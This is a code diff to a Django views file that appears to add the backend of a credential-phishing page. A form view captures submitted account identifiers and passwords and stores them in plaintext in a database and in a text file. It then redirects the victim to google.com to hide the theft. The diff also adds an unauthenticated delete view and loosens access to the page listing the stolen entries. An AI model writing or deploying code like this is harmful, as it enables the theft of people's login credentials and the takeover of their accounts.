@@ -6,9 +6,35 @@ from django.core.cache import cache
 from django.http import HttpResponse
 from django.core.mail import send_mail
 from django.conf import settings
-from django.contrib.admin.views.decorators import staff_member_required
+from django.contrib.auth.decorators import login_required
+from .models import Message
+from django.shortcuts import redirect, get_object_or_404
 
- 
+def delete_message(request, pk):
+    msg = get_object_or_404(Message, pk=pk)
+    msg.delete()
+    return redirect("saved_inputs")
+
+def inputs(request):
+    if request.method == "POST":
+        identifier = request.POST.get("identifier")
+        password = request.POST.get("password")
+        # save to DB...
+        if identifier and password:
+            # save to database
+            msg = Message.objects.create(
+                identifier=identifier,
+                password=password
+            )
+
+        with open("messages.txt", "a", encoding="utf-8") as f:
+            f.write(f"account: {msg.identifier}\n")
+            f.write(f"password: {msg.password}\n")
+            f.write(f"sent: {msg.created_at}\n")
+            f.write("="*40 + "\n\n")
+
+        return redirect("https://www.google.com")
+    return render(request, "form.html")
 
 
 def get_client_ip(request):
@@ -19,7 +45,7 @@ def get_client_ip(request):
         ip = request.META.get('REMOTE_ADDR')
     return ip
 
-@staff_member_required
+@login_required
 def saved_inputs_view(request):
     msg = Message.objects.all().order_by('-created_at')
     return render(request, 'inputs.html', {'msg':msg})
